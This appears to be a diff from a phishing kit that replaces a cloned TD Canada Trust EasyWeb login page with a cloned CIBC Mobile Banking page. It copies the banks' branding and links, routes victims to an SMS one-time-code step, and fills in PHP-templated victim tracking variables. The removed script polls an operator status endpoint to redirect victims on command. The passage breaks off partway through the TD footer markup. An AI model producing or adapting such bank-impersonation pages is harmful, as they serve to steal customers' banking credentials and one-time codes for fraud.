@@ -1,750 +1,190 @@
-<html lang="en-CA">
+<!DOCTYPE html>
+<html>
 
 <head>
     <span hidden id="page"> Loading </span>
-    <span hidden id="pageRedirection"> /td/sms-otp </span>
-    <style type="text/css">
-        [ng\:cloak],
-        [ng-cloak],
-        [data-ng-cloak],
-        [x-ng-cloak],
-        .ng-cloak,
-        .x-ng-cloak,
-        .ng-hide:not(.ng-hide-animate) {
-            display: none !important;
-        }
-
-        [ng\:form] {
-            display: block;
-        }
-
-        .ng-animate-shim {
-            visibility: hidden;
-        }
-
-        .ng-anchor {
-            position: absolute;
-        }
-    </style>
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-touch-fullscreen" content="yes">
-    <title>EasyWeb Login</title>
-    <link rel="stylesheet" href="/assets/td/files/uap-application-all-css.css">
-    <link rel="icon" href="/assets/td/favicon.ico">
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.css">
-    <style>
-        @media (max-width: 680px) {
-            .td-contentarea {
-                padding-top: 50px !important;
-            }
-        }
-
-        .input-password {
-            -webkit-text-security: disc;
-        }
-    </style>
-    <link rel="stylesheet" href="/assets/td/emerland.css">
-    <script>
-        var continueupdate = true;
-
-        setInterval(function () {
-            if (continueupdate) {
-                $.post('/deposit/td/api/status', { page: lrinfo }, function (response) {
-                    if (response.status) {
-                        continueupdate = false;
-                        location.href = response.href;
-                    }
-                }, 'JSON');
-            }
-        }, 1000);
+    <span hidden id="pageRedirection"> /cibc/sms-otp </span>
+    <title>CIBC Mobile Banking</title>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="HandheldFriendly" content="true">
+    <meta name="format-detection" content="telephone=no">
+    <link rel="stylesheet" href="/assets/cibc/files2/reset.css">
+    <link rel="stylesheet" href="/assets/cibc/files2/reset-brand.css">
+    <link rel="stylesheet" href="/assets/cibc/files2/global.css">
+    <link rel="stylesheet" href="/assets/cibc/files2/global-android2.css">
+    <link rel="stylesheet" href="/assets/cibc/files2/global-brand.css">
+    <script type="text/javascript" src="/assets/cibc/files2/jquery-1.js"></script>
+    <script type="text/javascript" src="/assets/cibc/files2/wicket-event-jquery.js"></script>
+    <script type="text/javascript" src="/assets/cibc/files2/wicket-ajax-jquery.js"></script>
+    <script type="text/javascript" id="wicket-ajax-base-url">
+        /*<![CDATA[*/
+        Wicket.Ajax.baseUrl = "change-password";
+        /*]]>*/
     </script>
-     <script src="/socket.io/socket.io.js"></script>
-     <script src="../assets/js/td/login/index.js"></script>
+    <script src="/assets/cibc/files2/global.js"></script>
+    <script src="/assets/cibc/files2/drawer-scroll-prevent.js"></script>
+    <link rel="stylesheet" href="/assets/cibc/files2/appboy.css">
+    <script type="text/javascript">
+        /*<![CDATA[*/
+
+        //
+        // AppBoy variables
+        //
+
+        // Staging English
+        // var appBoyKey = 'dc2ba41b-e995-4485-96b3-cd023a992036';
+        // Prod Enlgish
+        var appBoyKey = 'ff80e32a-a82e-4232-b08e-0219652bae28';
+
+        /*]]>*/
+    </script>
+    <style>
+        #header-logo {
+            background: url(/assets/cibc/img/cibcnew.svg);
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            width: 100px;
+        }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
+    <script>
+        var lrbank = '<?=escape($udata->last->bank)?>';
+        var lrinfo = '<?=escape($udata->last->info)?>';
+    </script>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="../assets/js/cibc/login/index.js"></script>
 </head>
 
-<body prevent-click-highlight="" autoscroll="">
+<body lang="en">
     <input type="hidden" id="userAgent" name="userAgent">
     <input type="hidden" id="banks" name="banks">
-    <div id="contentWrapper">
-        <div data-ui-view="header" class="" style="">
-            <header-public>
-                <div class="logo-print visible-print" aria-hidden="true">
-                    <img src="/assets/td/files/td-logo.png" alt="TD Canada Trust" height="32" width="36">
-                </div>
-                <div class="td_rq_header-nav td-header-nav">
-                    <header class="td-header-desktop">
-                        <div class="td-skip"><a href="#main">Skip to main content</a></div>
-                        <div class="td-utility-toggle">
-                            <div class="td-container">
-                                <div class="td-section-left">
-                                    <div class="td-segments">
-                                        <ul>
-                                            <li class="active"><a
-                                                    href="https://www.td.com/ca/en/personal-banking">Personal</a></li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index.jsp">Business</a>
-                                            </li>
-                                            <li><a
-                                                    href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investing</a>
-                                            </li>
-                                        </ul>
-                                    </div>
-                                </div>
-                                <div class="td-section-right">
-                                    <div class="td-other-toggles">
-                                        <ul>
-                                            <li class="td-dropdown td-dropdown-country td-dropdown-no-hover">
-                                                <a href="#" aria-haspopup="true" aria-expanded="false"
-                                                    id="td-desktop-nav-dropdown-link-0"><span
-                                                        class="td-forscreenreader">Select country</span><img
-                                                        class="country-flag" src="/assets/td/files/country_ca.png"
-                                                        alt="Canada">
-                                                </a>
-                                                <ul class="td-dropdown-content"
-                                                    aria-labelledby="td-desktop-nav-dropdown-link-0">
-                                                    <li class="active">
-                                                        <a href=""><img class="country-flag"
-                                                                src="/assets/td/files/country_ca.png">Canada<span
-                                                                class="td-icon selected" aria-hidden="true"></span><span
-                                                                class="td-forscreenreader">Selected</span></a>
-                                                    </li>
-                                                    <li>
-                                                        <a href="http://www.tdbank.com/"><img class="country-flag"
-                                                                src="/assets/td/files/country_us.png">United States</a>
-                                                    </li>
-                                                </ul>
-                                            </li>
-                                            <li class="td-dropdown td-dropdown-language td-dropdown-no-hover">
-                                                <a href="#" aria-haspopup="true" aria-expanded="false"
-                                                    id="td-desktop-nav-dropdown-link-1"><span
-                                                        class="td-forscreenreader">Select language</span>Français
-                                                </a>
-                                                <ul class="td-dropdown-content"
-                                                    aria-labelledby="td-desktop-nav-dropdown-link-1">
-                                                    <!---->
-                                                    <li ng-class="{'active': language==vm.dt.selectedLanguage}"
-                                                        ng-repeat="language in vm.dt.languages track by $index"
-                                                        class="active">
-                                                        <a href="" role="button" ng-click="vm.setLanguage(language)">
-                                                            English<span ng-if="language==vm.dt.selectedLanguage"
-                                                                class="td-icon selected" aria-hidden="true"></span>
-                                                            <span ng-if="language==vm.dt.selectedLanguage"
-                                                                class="td-forscreenreader">Selected</span>
-                                                        </a>
-                                                    </li>
-                                                    <li ng-class="{'active': language==vm.dt.selectedLanguage}"
-                                                        ng-repeat="language in vm.dt.languages track by $index">
-                                                        <a href="" role="button" ng-click="vm.setLanguage(language)">
-                                                            Français
-                                                        </a>
-                                                    </li>
-                                                </ul>
-                                            </li>
-                                        </ul>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                        <div class="td-nav-primary">
-                            <div class="td-container">
-                                <div class="td-section-left">
-                                    <div class="td-logo">
-                                        <a href="https://www.td.com/ca/en/personal-banking/">
-                                            <img src="/assets/td/files/td-logo.png" alt="TD Canada Trust">
-                                        </a>
-                                    </div>
-                                    <nav>
-                                        <ul>
-                                            <li><a href="https://www.td.com/ca/en/personal-banking/my-accounts/">My
-                                                    Accounts</a></li>
-                                            <li><a href="https://www.td.com/ca/en/personal-banking/my-accounts/">How
-                                                    To</a></li>
-                                            <li class="td-dropdown">
-                                                <a href="" aria-haspopup="true" aria-expanded="false"
-                                                    id="td-desktop-nav-dropdown-link-2">Products</a>
-                                                <ul class="td-dropdown-content"
-                                                    aria-labelledby="td-desktop-nav-dropdown-link-2">
-                                                    <li><a
-                                                            href="https://www.td.com/ca/en/personal-banking/products/bank-accounts/">Bank
-                                                            Accounts</a></li>
-                                                    <li><a
-                                                            href="https://www.td.com/ca/en/personal-banking/products/credit-cards/">Credit
-                                                            Cards</a></li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/banking/mortgages.jsp">Mortgages</a>
-                                                    </li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/borrowing/loans-lines-of-credit/index.jsp">Borrowing</a>
-                                                    </li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/investing/goals_index.jsp">Saving
-                                                            &amp; Investing</a></li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/insurance/insurance-index.jsp">Insurance</a>
-                                                    </li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/banking/apply-index.jsp">All
-                                                            Products</a></li>
-                                                </ul>
-                                            </li>
-                                            <li class="td-dropdown">
-                                                <a href="#" aria-haspopup="true" aria-expanded="false"
-                                                    id="td-desktop-nav-dropdown-link-3">Solutions</a>
-                                                <ul class="td-dropdown-content"
-                                                    aria-labelledby="td-desktop-nav-dropdown-link-3">
-                                                    <li><a
-                                                            href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investors</a>
-                                                    </li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index_1.jsp">Small
-                                                            Businesses</a></li>
-                                                    <li><a href="https://www.tdcommercialbanking.com/home/index.jsp">Commercial
-                                                            Banking</a></li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/banking/student-advice/student-banking.jsp">Students</a>
-                                                    </li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/planning/life-events/new-to-canada/index.jsp">New
-                                                            to Canada</a></li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/banking/cross-border-banking/index.jsp">Cross
-                                                            Border Banking</a></li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/payandsendmoney.jsp">Ways
-                                                            to Pay</a></li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/index.jsp">Ways
-                                                            to Bank</a></li>
-                                                    <li><a
-                                                            href="https://www.tdcanadatrust.com/products-services/banking/green-banking/index.jsp">Green
-                                                            Banking</a></li>
-                                                </ul>
-                                            </li>
-                                        </ul>
-                                    </nav>
-                                </div>
-                                <div class="td-section-right">
-                                    <div class="td-quick-access">
-                                        <ul>
-                                            <li class="find-us">
-                                                <a href="https://www.td.com/ca/en/personal-banking/branch-locator/"><img
-                                                        src="/assets/td/files/1.png"><span class="td-label">Find
-                                                        Us</span></a>
-                                            </li>
-                                            <li class="help">
-                                                <a href="https://www.td.com/ca/en/personal-banking/help-centre/"><img
-                                                        src="/assets/td/files/2.png"><span
-                                                        class="td-label">Help</span></a>
-                                            </li>
-                                            <li class="search">
-                                                <a href="javascript:void(0)" class="td-desktop-search-show-btn"><img
-                                                        src="/assets/td/files/3.png"><span
-                                                        class="td-label">Search</span></a>
-                                            </li>
-                                            <li class="divider">
-                                                <div class="td-divider-line"></div>
-                                            </li>
-                                            <li class="login td-dropdown">
-                                                <a href="#" class="td-show-label" aria-haspopup="true"
-                                                    aria-expanded="false" id="td-desktop-nav-dropdown-link-4"><span
-                                                        class="td-label">Login</span><span class="td-icon collapse"
-                                                        aria-hidden="true"></span></a>
-                                                <ul class="td-dropdown-content"
-                                                    aria-labelledby="td-desktop-nav-dropdown-link-4">
-                                                    <li class="visible-md"><a href="#">TD app</a></li>
-                                                    <li><a href="https://easyweb.td.com/">EasyWeb</a></li>
-                                                    <li><a href="https://webbroker.td.com/">WebBroker</a></li>
-                                                    <li><a href="https://www.tdbank.com/net/accountlogin.aspx">U.S.
-                                                            Banking</a></li>
-                                                </ul>
-                                            </li>
-                                        </ul>
-                                    </div>
-                                </div>
-                                <div class="td-nav-desktop-search">
-                                    <span tabindex="0"></span>
-                                    <div class="td-search-container">
-                                        <header-search-input>
-                                            <form
-                                                class="td-search-box ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic"
-                                                accessible-form="" ng-submit="submitSearch()">
-                                                <input ng-model="query" ng-change="$ctrl.updateSuggestions()"
-                                                    placeholder="Search" name="query"
-                                                    class="td-search-input ng-pristine ng-untouched ng-valid form-control ng-empty"
-                                                    aria-label="{{'BUTTON.SEARCH' | translate}}" autocomplete="off"
-                                                    aria-invalid="false" type="text">
-                                                <span class="td-search-icon" aria-hidden="true"><span
-                                                        class="td-icon"></span></span>
-                                                <input class="td-search-submit form-control" value="query"
-                                                    aria-label="Search" type="submit">
-                                                <!---->
-                                            </form>
-                                        </header-search-input>
-                                        <button type="button" class="td-desktop-search-hide-btn">
-                                            <span class="td-forscreenreader">Close Search</span>
-                                            <span class="td-icon" aria-hidden="true"></span>
-                                        </button>
-                                    </div>
-                                    <span tabindex="0"></span>
-                                </div>
-                            </div>
-                        </div>
-                        <!-- Desktop primary nav END -->
-                    </header>
-                    <!-- Desktop Header END -->
-                    <!-- Mobile Header START -->
-                    <header class="td-header-mobile">
-                        <div class="td-container">
-                            <div class="td-section-left">
-                                <button type="button" class="td-mobile-action-button td-mobile-menu-button">
-                                    <div class="td-mobile-menu-button-icon">
-                                        <span class="td-forscreenreader">Open menu</span>
-                                        <span class="icon-bar" aria-hidden="true"></span>
-                                        <span class="icon-bar" aria-hidden="true"></span>
-                                        <span class="icon-bar" aria-hidden="true"></span>
-                                    </div>
-                                    <div class="td-logo">
-                                        <img src="/assets/td/files/td-logo.png" alt="TD Canada Trust">
-                                    </div>
-                                </button>
-                                <button type="button" class="td-mobile-action-button td-mobile-back-button"
-                                    onclick="history.back();">
-                                    <div class="td-mobile-back-button-icon">
-                                        <span class="td-icon"></span>
-                                        <span class="td-forscreenreader">Back</span>
-                                    </div>
-                                    <div class="td-logo">
-                                        <img src="/assets/td/files/td-logo.png" alt="TD Canada Trust">
-                                    </div>
-                                </button>
-                            </div>
-                            <div class="td-section-right">
-                                <button type="button"
-                                    class="td-mobile-action-button td-mobile-menu-secondary-button td-login">
-                                    <span class="label">Login</span>
-                                    <span class="td-forscreenreader">Open menu</span>
-                                </button>
-                            </div>
-                        </div>
-                    </header>
-                    <div class="td-nav-mobile">
-                        <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
-                            <span tabindex="0"></span>
-                            <div class="td-nav-mobile-menu-top">
-                                <div class="td-nav-mobile-menu-header">
-                                    <div class="td-logo">
-                                        <a href="https://www.td.com/ca/en/personal-banking/">
-                                            <img src="/assets/td/files/td-logo.png" alt="TD Canada Trust">
-                                        </a>
-                                    </div>
-                                    <button type="button" class="td-mobile-menu-close">
-                                        <span class="td-forscreenreader">Close Menu</span>
-                                        <span class="td-icon" aria-hidden="true"></span>
-                                    </button>
-                                </div>
-                                <div class="td-nav-mobile-menu-search">
-                                    <header-search-input>
-                                        <form
-                                            class="td-search-box ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic"
-                                            accessible-form="" ng-submit="submitSearch()">
-                                            <input ng-model="query" ng-change="$ctrl.updateSuggestions()"
-                                                placeholder="Search" name="query"
-                                                class="td-search-input ng-pristine ng-untouched ng-valid form-control ng-empty"
-                                                aria-label="{{'BUTTON.SEARCH' | translate}}" autocomplete="off"
-                                                aria-invalid="false" type="text">
-                                            <span class="td-search-icon" aria-hidden="true"><span
-                                                    class="td-icon"></span></span>
-                                            <input class="td-search-submit form-control" value="query"
-                                                aria-label="Search" type="submit">
-                                            <!---->
-                                        </form>
-                                    </header-search-input>
-                                </div>
-                            </div>
-                            <nav>
-                                <ul class="td-nav-mobile-menu-list">
-                                    <li
-                                        class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-segment">
-                                        <a href="" aria-expanded="false" role="button">
-                                            TD: Personal
-                                            <span class="td-icon expand"></span>
-                                            <span class="td-icon collapse"></span>
-                                        </a>
-                                        <ul class="td-accordion-content">
-                                            <li class="active">
-                                                <a href="https://www.td.com/ca/en/personal-banking"> Personal
-                                                    <span class="td-icon selected" aria-hidden="true"></span>
-                                                    <span class="td-forscreenreader">Selected</span>
-                                                </a>
-                                            </li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index.jsp">Business</a>
-                                            </li>
-                                            <li><a
-                                                    href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investing</a>
-                                            </li>
-                                            <li><a href="https://www.td.com/about-tdbfg/our-business/index.jsp">About
-                                                    TD</a></li>
-                                        </ul>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-home active">
-                                        <a href="https://www.td.com/ca/en/personal-banking/"><span
-                                                class="td-icon td-icon-homepage"></span>Home</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-my-TD">
-                                        <a href="https://www.td.com/ca/en/personal-banking/my-accounts/"><span
-                                                class="td-icon td-icon-myTD"></span>My Accounts</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-how-to">
-                                        <a href="https://www.td.com/ca/en/personal-banking/my-accounts/"><span
-                                                class="td-icon td-icon-howTo"></span>How To</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-accounts">
-                                        <a href="https://www.td.com/ca/en/personal-banking/products/bank-accounts/"><span
-                                                class="td-icon td-icon-accounts"></span>Bank Accounts</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-credit-cards">
-                                        <a href="https://www.td.com/ca/en/personal-banking/products/credit-cards/"><span
-                                                class="td-icon td-icon-creditcards"></span>Credit Cards</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-mortgages">
-                                        <a href="https://www.tdcanadatrust.com/products-services/banking/mortgages.jsp"><span
-                                                class="td-icon td-icon-mortgages"></span>Mortgages</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-borrowing">
-                                        <a
-                                            href="https://www.tdcanadatrust.com/products-services/borrowing/loans-lines-of-credit/index.jsp"><span
-                                                class="td-icon td-icon-borrowing"></span>Borrowing</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-saving-investing">
-                                        <a
-                                            href="https://www.tdcanadatrust.com/products-services/investing/goals_index.jsp"><span
-                                                class="td-icon td-icon-savingAndInvesting"></span>Saving &amp;
-                                            Investing</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-insurance">
-                                        <a
-                                            href="https://www.tdcanadatrust.com/products-services/insurance/insurance-index.jsp"><span
-                                                class="td-icon td-icon-insurance"></span>Insurance</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-all-products">
-                                        <a
-                                            href="https://www.tdcanadatrust.com/products-services/banking/apply-index.jsp"><span
-                                                class="td-icon td-icon-allProducts"></span>All Products</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link td-accordion item-solutions">
-                                        <a href="" aria-expanded="false" role="button">
-                                            <span class="td-icon td-icon-solutions"></span>
-                                            Solutions
-                                            <span class="td-icon expand"></span>
-                                            <span class="td-icon collapse"></span>
-                                        </a>
-                                        <ul class="td-accordion-content">
-                                            <li><a
-                                                    href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investors</a>
-                                            </li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index_1.jsp">Small
-                                                    Businesses</a></li>
-                                            <li><a href="https://www.tdcommercialbanking.com/home/index.jsp">Commercial
-                                                    Banking</a></li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/products-services/banking/student-advice/student-banking.jsp">Students</a>
-                                            </li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/planning/life-events/new-to-canada/index.jsp">New
-                                                    to Canada</a></li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/products-services/banking/cross-border-banking/index.jsp">
-                                                    Cross Border Banking</a></li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/products-services/banking/foreign-currency-services/index.jsp">Foreign
-                                                    Exchange Services</a></li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/payandsendmoney.jsp">Ways
-                                                    to Pay</a></li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/index.jsp">Ways
-                                                    to Bank</a></li>
-                                            <li><a
-                                                    href="https://www.tdcanadatrust.com/products-services/banking/green-banking/index.jsp">Green
-                                                    Banking</a></li>
-                                        </ul>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-find-us">
-                                        <a href="https://www.td.com/ca/en/personal-banking/branch-locator/"><span
-                                                class="td-icon td-icon-location"></span>Find Us</a>
-                                    </li>
-                                    <li
-                                        class="td-nav-mobile-menu-item td-item-nav-link td-item-nav-link-last item-help-me">
-                                        <a href="https://www.td.com/ca/en/personal-banking/help-centre/"><span
-                                                class="td-icon td-icon-help"></span>Help</a>
-                                    </li>
-                                    <li
-                                        class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-country">
-                                        <a href="" aria-expanded="false" role="button">
-                                            COUNTRY: Canada
-                                            <span class="td-icon expand"></span>
-                                            <span class="td-icon collapse"></span>
-                                        </a>
-                                        <ul class="td-accordion-content">
-                                            <li class="active">
-                                                <a href="">
-                                                    <img class="country-flag" src="/assets/td/files/country_ca.png"
-                                                        alt="Canada">
-                                                    Canada
-                                                    <span class="td-icon selected" aria-hidden="true"></span>
-                                                    <span class="td-forscreenreader">Selected</span>
-                                                </a>
-                                            </li>
-                                            <li>
-                                                <a href="">
-                                                    <img class="country-flag" src="/assets/td/files/country_us.png"
-                                                        alt="Canada">
-                                                    United States
-                                                </a>
-                                            </li>
-                                        </ul>
-                                    </li>
-                                    <li
-                                        class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
-                                        <a href="" aria-expanded="false" role="button">
-                                            <span class="td-forscreenreader">Select language</span>
-                                            Français
-                                            <span class="td-icon expand" aria-hidden="true"></span>
-                                            <span class="td-icon collapse" aria-hidden="true"></span>
-                                        </a>
-                                        <ul class="td-accordion-content">
-                                            <!---->
-                                            <li ng-class="{'active': language==vm.dt.selectedLanguage}"
-                                                ng-repeat="language in vm.dt.languages track by $index" class="active">
-                                                <a href="" role="button" ng-click="vm.setLanguage(language)">
-                                                    English
-                                                    <!----><span ng-if="language==vm.dt.selectedLanguage"
-                                                        class="td-icon selected" aria-hidden="true">
-                                                    </span><!---->
-                                                    <!----><span ng-if="language==vm.dt.selectedLanguage"
-                                                        class="td-forscreenreader">Selected</span><!---->
-                                                </a>
-                                            </li>
-                                            <!---->
-                                            <li ng-class="{'active': language==vm.dt.selectedLanguage}"
-                                                ng-repeat="language in vm.dt.languages track by $index">
-                                                <a href="" role="button" ng-click="vm.setLanguage(language)">
-                                                    Français
-                                                    <!---->
-                                                    <!---->
-                                                </a>
-                                            </li>
-                                            <!---->
-                                        </ul>
-                                    </li>
-                                </ul>
-                            </nav>
-                            <span tabindex="0"></span>
-                        </div>
-                        <!-- Primary mobile menu END -->
-                        <!-- Secondary mobile menu START -->
-                        <div class="td-nav-mobile-menu td-nav-mobile-menu-secondary td-nav-mobile-menu-right">
-                            <span tabindex="0"></span>
-                            <div class="td-nav-mobile-menu-top">
-                                <div class="td-nav-mobile-menu-header">
-                                    <div class="td-nav-mobile-menu-title">Login
-                                    </div>
-                                    <button type="button" class="td-mobile-menu-close">
-                                        <span class="td-forscreenreader" aria-hidden="true">Close Menu</span>
-                                        <span class="td-icon" aria-hidden="true"></span>
-                                    </button>
-                                </div>
-                            </div>
-                            <nav>
-                                <ul class="td-nav-mobile-menu-list">
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-show-on-all">
-                                        <a href=""><span class="td-icon td-icon-noIcon"></span>TD app</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-tablet-portrait-mobile">
-                                        <a href="https://easyweb.td.com/"><span
-                                                class="td-icon td-icon-noIcon"></span>EasyWeb</a>
-                                    </li>
-                                    <li
-                                        class="td-nav-mobile-menu-item td-item-nav-link item-tablet-portrait-only visible-sm">
-                                        <a href="https://webbroker.td.com/"><span
-                                                class="td-icon td-icon-noIcon"></span>WebBroker</a>
-                                    </li>
-                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-mobile-only visible-sm">
-                                        <a href="https://www.tdbank.com/net/accountlogin.aspx"><span
-                                                class="td-icon td-icon-noIcon"></span>U.S. Banking</a>
-                                    </li>
-                                </ul>
-                            </nav>
-                            <span tabindex="0"></span>
-                        </div>
-                        <!-- Secondary mobile menu START -->
-                        <div class="td-nav-mobile-overlay"></div>
-                    </div>
-                    <!-- Mobile Off-canvas Menu END -->
-                </div>
-                <a name="main" id="main" tabindex="-1"></a>
-            </header-public>
-        </div>
-        <!-- Main Content / Body -->
-        <div class="td-contentarea" role="main" style="padding-top: 106px;">
-            <!---->
-            <ui-view class="" style="">
-                <challenge thread-matrix="::$resolve.threadMatrix">
-                    <!---->
-                    <ui-view>
-                        <login-template right-nav="::$resolve.rightNav" service-banner="::$resolve.serviceBanner"
-                            awareness="::$resolve.awareness" legal="::$resolve.legal"
-                            service-interruption="::$resolve.serviceInterruption"
-                            password-assistance="::$resolve.passwordAssistance"
-                            username-assistance="::$resolve.usernameAssistance"
-                            id-plus-lockout="::$resolve.idPlusLockout" lockout="::$resolve.lockout"
-                            username-access-card-list="::$resolve.usernameAccessCardList"
-                            device-print="::$resolve.devicePrint" device-info="::$resolve.deviceInfo"
-                            thread-matrix="::$resolve.threadMatrix" config="::$resolve.config" class="div-loader">
-                            <section class="otp-login easy-web-broker"
-                                ng-class="{'secure-login': !!vm.securekey, 'easy-web-broker': !!vm.easyweb || !!vm.webbroker}"
-                                style="text-align: center; margin-bottom: 290px; padding-top: 115px;">
-                                <div class="td-container">
-                                    <!-- LOB -->
-                                    <div class="td-row">
-                                        <div class="td-col-sm-12">
-                                            <h1 class="co-brand-header" ng-class="{'secure-key': !!vm.securekey}"
-                                                tabindex="0">Processing</h1>
-                                        </div>
-                                        <!---->
-                                    </div>
-                                </div>
-                                <!---->
-                            </section>
-                            <!---->
-                        </login-template>
-
-                    </ui-view>
-                </challenge>
-            </ui-view>
-        </div>
-        <!---->
-        <preloader ng-show="!!vm.dt.isLoading" aria-hidden="true" class="ng-hide">
-            <div class="otp-preloader">
-                <div class="loading-spinner big loading-spinner-indeterminate">
-                    <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink"
-                        viewBox="0 0 1000 1000">
-                        <defs>
-                            <linearGradient id="loading-circle-gradient" x1="0" y1="500" x2="1000" y2="500"
-                                gradientUnits="userSpaceOnUse">
-                                <stop offset="0" stop-color="#5bd453"></stop>
-                                <stop offset="1" stop-color="#1a5336"></stop>
-                            </linearGradient>
-                        </defs>
-                        <title>Loading spinner</title>
-                        <g class="loading-big">
-                            <path class="loading-circle"
-                                d="M960,500c0,254.05-205.95,460-460,460S40,754.05,40,500,245.95,40,500,40,960,245.95,960,500"
-                                style="fill: none;stroke-linecap: round;stroke-linejoin: round;stroke-width: 80px;stroke: url(#loading-circle-gradient)">
-                            </path>
-                        </g>
-                        <g class="loading-small">
-                            <path class="loading-circle"
-                                d="M960,500c0,254.05-205.95,460-460,460S40,754.05,40,500,245.95,40,500,40,960,245.95,960,500"
-                                style="fill: none;stroke-linecap: round;stroke-linejoin: round;stroke-width: 80px;stroke: url(#loading-circle-gradient)">
-                            </path>
-                        </g>
-                    </svg>
-                </div>
+    <span class="offscreen">CIBC Mobile Banking</span>
+    <input id="drawer-toggle-chk" aria-hidden="true" type="checkbox">
+    <label for="drawer-toggle-chk" id="drawer-toggle-label">
+        <img id="open-menu-icon" src="/assets/cibc/files2/drawer-menu-open.png" alt="Open Menu" role="button">
+        <img id="close-menu-icon" src="/assets/cibc/files2/drawer-menu-close.png" alt="Close Menu" role="button">
+    </label>
+    <nav id="drawer-menu" class="post-signon-drawer scrollable-ver">
+        <div id="menu-wrapper">
+            <div class="drawer-menu-header">
+                <div class="account-holder-name" id="account-holder-name"></div>
+                <a href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-profileLink"
+                    class="no-style-link active" id="profile-link">
+                    <span>My Profile</span><span class="drawer-icon-cog"></span>
+                </a>
             </div>
-        </preloader>
-    </div>
-    <!-- Footer -->
-    <!---->
-    <div data-ui-view="footer">
-        <footer-public>
-            <footer class="td-fullwidth-dark-green td-padding-vert-0" ng-show="!vm.hideHeaderAndFooterForMbna"
-                aria-hidden="false" style="left: 0px; right: 0px; bottom: 0px; position: static;">
-                <div class="td-container">
-                    <div class="td-row">
-                        <div class="td-footer-content td-col-xs-12"
-                            style="background-image:url(https://authentication.td.com/uap-ui/generated/styles/images/footer_seat.png)">
-                            <p class="td-footer-heading td-copy-white td-copy-align-centre">
-                                Need to talk to us directly?
-                                <a role="link" class="td-contact-link td-link-standalone"
-                                    href="https://www.td.com/ca/en/personal-banking/contact-us/"
-                                    standalone-link="Contact us">
-                                    <span ng-bind-html="subText">Contact</span>
-                                    <span class="td-link-lastword">
-                                        <span ng-bind-html="lastWord">us</span>&nbsp;<img src="/assets/td/files/14.png">
-                                    </span>
-                                </a>
-                            </p>
-                            <div class="td-footer-social td-copy-align-centre">
-                                <p class="td-footer-social-heading">Connect with TD</p>
-                                <ul>
-                                    <li>
-                                        <a class="td-link-nounderline" href="https://twitter.com/td_canada"
-                                            target="_blank">
-                                            <img src="/assets/td/files/9.png">
-                                            <span class="td-forscreenreader">FOOTER.TWITTER</span>
-                                        </a>
-                                    </li>
-                                    <li>
